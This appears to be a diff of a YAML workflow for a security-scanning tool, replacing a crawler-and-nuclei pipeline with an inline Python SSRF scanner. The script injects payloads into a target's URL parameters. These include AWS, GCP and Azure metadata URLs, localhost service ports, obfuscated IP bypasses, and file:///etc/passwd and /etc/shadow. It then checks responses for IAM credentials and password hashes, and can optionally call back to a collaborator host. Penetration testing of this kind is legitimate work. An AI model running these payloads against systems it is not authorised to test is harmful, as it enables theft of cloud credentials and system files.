@@ -1,146 +1,139 @@
 name: ssrf-scan
 description: |
-  Server-Side Request Forgery testing — collects parameterized URLs via
-  crawling and parameter discovery, then tests for SSRF using nuclei
-  templates and targeted fuzzing.
-tags:
-  - web
-  - vuln
-  - ssrf
-  - fuzz
-
+  Server-Side Request Forgery (SSRF) scanner — test URL parameters
+  for SSRF vulnerabilities using common bypass techniques, internal
+  IP redirects, and cloud metadata endpoint access.
+tags: [web, ssrf, vulnerability, security]
 dispatch:
   inputs:
     target:
       required: true
       type: string
-      description: Target URL or domain (e.g. https://example.com)
+      description: Target URL with parameter (e.g. https://app.com/fetch?url=)
       alias: t
+    callback:
+      type: string
+      default: ''
+      description: Callback URL (e.g. Burp collaborator or interactsh)
 
 jobs:
-  collect-params:
-    name: Parameter Collection
+  scan:
+    name: SSRF Detection
     steps:
-      - task: paramspider
-        name: paramspider-extract
-        with:
-          target: '{{ inputs.target }}'
-        log-stdout: true
-        continue-on-error: true
+    - name: test-ssrf
+      script: |
+        import urllib.request
+        import urllib.error
+        import urllib.parse
+        import re
 
-      - task: arjun
-        name: arjun-discover
-        with:
-          target: '{{ inputs.target }}'
-          threads: 20
-        log-stdout: true
-        continue-on-error: true
+        target_url = '{{ inputs.target }}'
+        callback = '{{ inputs.callback }}'
 
-      - task: katana
-        name: katana-crawl
-        with:
-          target: '{{ inputs.target }}'
-          depth: 2
-        log-stdout: true
-        continue-on-error: true
+        print(f"=== SSRF SCAN: {target_url} ===\n")
 
-      - name: merge-params
-        script: |
-          import json
+        # Parse URL to find parameter
+        parsed = urllib.parse.urlparse(target_url)
+        params = urllib.parse.parse_qs(parsed.query)
 
-          param_urls = set()
+        if not params:
+            print("[-] No URL parameters found. Provide URL with parameter, e.g.:")
+            print("    https://app.com/fetch?url=")
+            print("    https://app.com/proxy?target=")
 
-          for idx in [0, 1, 2]:
-              step_data = {{ steps | tojson }}
-              typed = step_data[idx].get('outputs', {}).get('typed_outputs', [])
-              for item in typed:
-                  if item.get('_type') == 'url':
-                      url = item.get('url', '')
-                      if url and ('=' in url or '?' in url):
-                          param_urls.add(url)
+        findings = []
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
 
-          with open('/tmp/ofx_ssrf_params.txt', 'w') as f:
-              f.write('\n'.join(sorted(param_urls)))
+        # SSRF payloads
+        payloads = {
+            # Cloud metadata
+            'aws_metadata': 'http://169.254.169.254/latest/meta-data/',
+            'aws_metadata_v2': 'http://169.254.169.254/latest/api/token',
+            'gcp_metadata': 'http://metadata.google.internal/computeMetadata/v1/',
+            'azure_metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
 
-          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
-              f.write(f"param_file=/tmp/ofx_ssrf_params.txt\n")
-              f.write(f"param_count={len(param_urls)}\n")
+            # Internal networks
+            'localhost_80': 'http://127.0.0.1:80',
+            'localhost_22': 'http://127.0.0.1:22',
+            'localhost_3306': 'http://127.0.0.1:3306',
+            'localhost_6379': 'http://127.0.0.1:6379',
+            'localhost_8080': 'http://127.0.0.1:8080',
 
-          print(f"Collected {len(param_urls)} parameterized URLs for SSRF testing")
-        log-stdout: true
+            # Bypass techniques
+            'decimal_ip': 'http://2130706433/',  # 127.0.0.1
+            'hex_ip': 'http://0x7f000001/',
+            'octal_ip': 'http://0177.0.0.1/',
+            'ipv6_localhost': 'http://[::1]/',
+            'short_url': 'http://0/',
+            'redirect_localhost': 'http://localtest.me/',
 
-  ssrf-test:
-    name: SSRF Testing
-    needs:
-      - collect-params
-    steps:
-      - task: nuclei
-        name: nuclei-ssrf
-        with:
-          target: '{{ jobs[''collect-params''].outputs.param_file | default(inputs.target, true) }}'
-          tags: ssrf
-        log-stdout: true
-        continue-on-error: true
+            # File protocol
+            'file_passwd': 'file:///etc/passwd',
+            'file_hosts': 'file:///etc/hosts',
+            'file_shadow': 'file:///etc/shadow',
+        }
 
-      - task: ffuf
-        name: ffuf-ssrf
-        with:
-          target: '{{ inputs.target }}'
-          wordlist: /usr/share/wordlists/seclists/Fuzzing/SSRFmap-param.txt
-          threads: 20
-        log-stdout: true
-        continue-on-error: true
+        if callback:
+            payloads['callback_http'] = callback
+            payloads['callback_dns'] = callback.replace('http://', '').replace('https://', '')
 
-      - task: nuclei
-        name: nuclei-oast
-        with:
-          target: '{{ jobs[''collect-params''].outputs.param_file | default(inputs.target, true) }}'
-          tags: oast
-        log-stdout: true
-        continue-on-error: true
+        for param_name in params:
+            print(f"--- Testing parameter: {param_name} ---\n")
 
-      - name: ssrf-summary
-        script: |
-          import json
+            for payload_name, payload in payloads.items():
+                new_params = dict(params)
+                new_params[param_name] = [payload]
+                query = urllib.parse.urlencode(new_params, doseq=True)
+                test_url = f"{base_url}?{query}"
 
-          ssrf_vulns = {{ vulns(steps[0].outputs.typed_outputs) | tojson }}
-          oast_vulns = {{ vulns(steps[2].outputs.typed_outputs) | tojson }}
+                try:
+                    req = urllib.request.Request(test_url, method='GET')
+                    req.add_header('User-Agent', 'Mozilla/5.0')
+                    resp = urllib.request.urlopen(req, timeout=5)
+                    body = resp.read().decode('utf-8', errors='replace')[:2000]
+                    status = resp.status
 
-          all_vulns = ssrf_vulns + oast_vulns
-          critical = [v for v in all_vulns if v.get('severity') == 'critical']
-          high = [v for v in all_vulns if v.get('severity') == 'high']
+                    # Check for indicators
+                    indicators = {
+                        'aws_metadata': ['ami-id', 'instance-id', 'security-credentials', 'iam'],
+                        'gcp_metadata': ['project', 'instance', 'attributes'],
+                        'file_passwd': ['root:', '/bin/bash', '/bin/sh'],
+                        'file_hosts': ['localhost', '127.0.0.1'],
+                        'file_shadow': ['root:', '$6$', '$y$'],
+                    }
 
-          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
-              f.write(f"vuln_count={len(all_vulns)}\n")
-              f.write(f"critical_count={len(critical)}\n")
-              f.write(f"high_count={len(high)}\n")
+                    matched = False
+                    for indicator_key, patterns in indicators.items():
+                        if indicator_key in payload_name:
+                            for pattern in patterns:
+                                if pattern in body:
+                                    severity = 'CRITICAL' if 'metadata' in payload_name or 'shadow' in payload_name else 'HIGH'
+                                    finding = f'[{severity}] {payload_name}: {pattern} found in response'
+                                    findings.append(finding)
+                                    print(f"  [!] {finding}")
+                                    matched = True
+                                    break
 
-          print("=" * 50)
-          print(f" SSRF SCAN COMPLETE: {{ inputs.target }}")
-          print("=" * 50)
-          print(f"Parameterized URLs tested: {{ jobs['collect-params'].outputs.param_count }}")
-          print(f"SSRF findings: {len(ssrf_vulns)}")
-          print(f"OAST findings: {len(oast_vulns)}")
-          print(f"Total: {len(all_vulns)} (C:{len(critical)} H:{len(high)})")
-        log-stdout: true
+                    if not matched and status == 200 and len(body) > 50:
+                        # Check response differs from baseline
+                        if payload_name.startswith('localhost'):
+                            findings.append(f'[MEDIUM] {payload_name}: Got {status} with {len(body)} bytes')
+                            print(f"  [?] {payload_name}: {status} ({len(body)} bytes)")
 
-      - name: export-to-project
-        script: |
-          from pathlib import Path
+                except urllib.error.HTTPError as e:
+                    if e.code in (500, 502, 503):
+                        print(f"  [?] {payload_name}: Server error {e.code} (possible blind SSRF)")
+                except Exception:
+                    pass
 
-          project = '{{ vars.project_path | default("", true) }}'
-          if not project:
-              print('No --project set, skipping file export')
-          else:
-              all_typed = []
-              for typed in [
-                  {{ jobs['collect-params'].outputs.typed_outputs | default([], true) | tojson }},
-                  {{ jobs['ssrf-test'].outputs.typed_outputs | default([], true) | tojson }},
-              ]:
-                  all_typed.extend(typed)
-              summaries = export_typed_outputs(project, all_typed)
-              for s in summaries:
-                  print(s)
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"finding_count={len(findings)}\n")
+            f.write(f"payloads_tested={len(payloads)}\n")
 
-              print(f'Project export complete: {project}')
-        continue-on-error: true
+        print(f"\n=== RESULTS: {len(findings)} findings ===")
+        for finding in findings:
+            print(f"  {finding}")
+        if not findings:
+            print("  No SSRF indicators detected")
+            print("  Tip: Use --input callback=<interactsh URL> for blind SSRF detection")
+      log-stdout: true
